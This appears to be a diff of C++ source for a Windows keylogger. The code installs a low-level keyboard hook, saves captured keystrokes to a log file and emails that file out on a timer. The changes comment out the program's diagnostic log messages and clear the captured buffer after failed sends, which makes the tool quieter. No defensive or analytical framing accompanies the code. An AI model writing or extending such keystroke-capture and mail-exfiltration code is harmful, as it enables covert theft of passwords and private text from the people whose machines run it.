@@ -17,13 +17,14 @@ void TimerSendMail(){
     std::string last_file = IO::WriteLog(keylog);
 
     if(last_file.empty()){
-        Helper::WriteAppLog("File creation unsuccessful.  Keylog '" + keylog + "'");
+        //Helper::WriteAppLog("File creation unsuccessful.  Keylog '" + keylog + "'");
         return;
     }
 
-    int x = Mail::SendMail("Log [" + last_file + "]", "Hi! \nThe file has been attached to the mail.\n" + keylog, IO::GetOurPath(true) + last_file);
+    int x = Mail::SendMail("Log [" + last_file + "]", keylog, IO::GetOurPath(true) + last_file);
     if(x != 7){
-        Helper::WriteAppLog("Mail was not sent, error code : " + Helper::toString(x));
+        //Helper::WriteAppLog("Mail was not sent, error code : " + Helper::toString(x));
+        keylog = ""; //keylog isn't supposed to clear when the send fails, but we aren't using the intended send method.
     }
     else{
         keylog = "";
@@ -57,7 +58,7 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam) {
 }
 
 bool InstallHook() {
-    Helper::WriteAppLog("Hook Started... Timer started.");
+    //Helper::WriteAppLog("Hook Started... Timer started.");
     MailTimer.Start(true);
 
     eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);
